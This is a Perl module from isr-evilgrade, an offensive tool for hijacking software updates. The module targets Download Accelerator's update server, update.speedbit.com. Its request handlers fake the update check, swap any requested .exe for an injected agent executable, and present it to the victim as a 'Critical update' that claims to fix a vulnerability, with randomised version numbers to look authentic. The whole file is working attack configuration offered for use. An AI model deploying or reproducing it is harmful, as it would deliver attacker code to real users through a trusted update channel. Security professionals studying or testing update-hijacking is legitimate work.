###############
# dap.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::dap;

use strict;
use Data::Dump qw(dump);

my $base = {
    'name'        => 'Download Accelerator',
    'version'     => '1.0',
    'appver'      => '< 9.5.0.3',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>'],
    'description' => qq{},
    'vh'          => '(update.speedbit.com)',
    'request'     => [
        {   'req'    => '^/cgi-bin/Update.dll',    #regex friendly
            'type'   => 'string',                  #file|string|agent
            'method' => '',                        #any
            'bin'    => '',
            'string' => 'OK',
            'parse'  => '',
            'file'   => ''
        },
        {   'req'    => '^/cgi-bin/update.dll',          #regex friendly
            'type'   => 'file',                          #file|string|agent
            'method' => '',                              #any
            'bin'    => '',
            'string' => '',
            'parse'  => '1',
            'file'   => './include/dap/dap_update.dll'
        },
        {   'req'    => '.exe',                          #regex friendly
            'type'   => 'agent',                         #file|string|agent
            'bin'    => 1,
            'method' => '',                              #any
            'string' => '',
            'parse'  => '',
            'file'   => ''
        },
        {   'req'    => 'updateok',    #regex friendly
            'type'   => 'install',     #file|string|agent|install
            'bin'    => 0,
            'method' => '',            #any
            'string' =>
                '<html><script>window.location="http://www.speedbit.com/finishupdate.asp?R=0"</script></html>',
            'parse' => '',
            'file'  => ''
        }
    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
        'enable' => { 'val' => 1, 'desc' => 'Status' },
        'title'  => {
            'val'  => 'Critical update',
            'desc' => 'Title name display in the update'
        },
        'description' => {
            'val'  => 'This critical update fix internal vulnerability',
            'desc' => 'Description display in the update'
        },
        'name' => {
            'val' =>
                "'dapupdate'.isrcore::utils::RndAlpha(isrcore::utils::RndNum(1))",
            'hidden'  => 1,
            'dynamic' => 1,
        },

        'version' => {
            'val' =>
                "'9'.isrcore::utils::RndNum(3).'.'.isrcore::utils::RndNum(4).'.'.isrcore::utils::RndNum(1).'.'.isrcore::utils::RndNum(1)",
            'hidden'  => 1,
            'dynamic' => 1,
        },

        'rnd1' => {
            'val'     => "isrcore::utils::RndNum(8)",
            'hidden'  => 1,
            'dynamic' => 1,
        },

        'endsite' => {
            'val'  => 'update.speedbit.com/updateok.html',
            'desc' => 'Website display when finish update'
        },
        'failsite' => {
            'val'  => 'www.speedbit.com/finishupdate.asp?noupdate=&R=0',
            'desc' => 'Website display when did\'t finish update'
        }
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES      class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
